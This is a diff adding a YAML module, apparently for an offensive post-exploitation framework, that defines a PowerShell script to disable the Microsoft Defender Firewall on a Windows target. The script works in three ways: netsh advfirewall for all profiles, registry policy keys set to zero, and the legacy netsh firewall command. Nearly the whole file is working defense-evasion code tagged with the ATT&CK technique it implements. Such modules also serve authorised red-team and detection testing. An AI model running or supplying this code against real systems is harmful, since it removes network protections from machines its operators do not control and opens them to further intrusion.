@@ -1,0 +1,71 @@
+name: Disable-Firewall
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Disables the Microsoft Defender Firewall on a Windows target.
+  Supports multiple methods including netsh advfirewall, registry
+  modification, and the deprecated netsh firewall command. The netsh
+  method disables the firewall for all profiles (domain, private,
+  public). The registry method disables the firewall via policy keys.
+software: ''
+tactics: [TA0005]
+techniques: [T1562.004]
+background: true
+output_extension:
+needs_admin: true
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: Method
+    description: Method to use for disabling the firewall.
+    required: false
+    value: 'netsh'
+    suggested_values:
+      - netsh
+      - registry
+      - netsh_legacy
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Disable-Firewall {
+      param([string]$Method = "netsh")
+
+      switch ($Method.ToLower()) {
+          "netsh" {
+              $result = netsh advfirewall set allprofiles state off 2>&1
+              Write-Output "[+] Executed: netsh advfirewall set allprofiles state off"
+              Write-Output $result
+          }
+          "registry" {
+              $profiles = @("DomainProfile", "StandardProfile", "PublicProfile")
+              foreach ($profile in $profiles) {
+                  $path = "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\$profile"
+                  if (-not (Test-Path $path)) {
+                      New-Item -Path $path -Force | Out-Null
+                  }
+                  New-ItemProperty -Path $path -Name "EnableFirewall" -PropertyType DWORD -Value 0 -Force | Out-Null
+                  Write-Output "[+] Disabled firewall via registry for $profile"
+              }
+          }
+          "netsh_legacy" {
+              $result = netsh firewall set opmode mode=disable 2>&1
+              Write-Output "[+] Executed: netsh firewall set opmode mode=disable"
+              Write-Output $result
+          }
+          default {
+              Write-Output "[-] Invalid method: $Method. Use netsh, registry, or netsh_legacy."
+          }
+      }
+  }
+script_end: Disable-Firewall -Method {{ Method }} {{ PARAMS }} | {{ OUTPUT_FUNCTION
+  }}
